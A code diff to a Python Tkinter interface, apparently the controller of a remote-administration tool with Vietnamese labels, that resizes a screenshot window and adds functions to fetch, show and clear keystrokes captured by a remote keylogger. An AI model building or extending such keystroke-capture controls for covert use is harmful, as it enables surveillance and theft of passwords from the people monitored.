@@ -232,7 +232,7 @@ def scr_window():
     my_scr.resizable(False, False)
     communicate.src_screen = my_scr
 
-    label = Label(my_scr, bg = "#FFFFFF", width=70, height=80) #width = img_width/3.5, height = img_height/3.2)
+    label = Label(my_scr, bg = "#FFFFFF", width=500/3.5, height=400/3.5) #width = img_width/3.5, height = img_height/3.2)
     # label.image = img
     label.place(relx = 0.055, rely = 0.165 )
 
@@ -240,8 +240,8 @@ def scr_window():
     img_path = os.path.join(script_dir, "tempData/tempImage.png")
     img = PhotoImage(file = img_path)
 
-    img_width = img.width()
-    img_height = img.height()
+    # img_width = img.width()
+    # img_height = img.height()
 
     img_width = 500
     img_height = 400
@@ -251,7 +251,27 @@ def scr_window():
     buton1.place(x = 600, y = 65 )
     buton2.place(x = 600, y = 380 )
 
+def send_keyLogger (s, txt):
+    click_button(s)
+    script_dir = os.path.dirname(__file__)
+    text_path = os.path.join(script_dir, "tempData/keylogger.txt")
+    
+    txt.pack()
+    try:
+        with open(text_path, 'r') as file:
+            content = file.read()
+            
+        # Clear the existing content from the Listbox
+        txt.delete(0, tk.END)
+        
+        # Insert the new content into the Listbox
+        txt.insert(tk.END, content)
+    except FileNotFoundError:
+        print("Keylogger file not found.")
 
+def delete_Keystroke(s, txt):
+    click_button(s)
+    txt.delete(0, tk.END)
 
 def kst_window():
     #if communicate.status_connection == 0:
@@ -268,8 +288,8 @@ def kst_window():
     frame1.pack(side="top", pady=20)
     button1 = ttk.Button(frame1, text="Hook", width=20, command=lambda: click_button("hook"))
     button2 = ttk.Button(frame1, text="Unhook", width=20, command=lambda: click_button("unhook"))
-    button3 = ttk.Button(frame1, text="In phím", width=20, command=lambda: click_button("sendkeylogger"))
-    button4 = ttk.Button(frame1, text="Xóa", width=20, command=lambda: click_button("deletecontentkeylogger"))
+    button3 = ttk.Button(frame1, text="In phím", width=20, command=lambda: send_keyLogger("sendkeylogger",txt))
+    button4 = ttk.Button(frame1, text="Xóa", width=20, command=lambda: delete_Keystroke("deletecontentkeylogger", txt))
     button_list = [button1, button2, button3, button4]
     for i in range(len(button_list)):
         button_list[i].pack(side="left", padx=15)
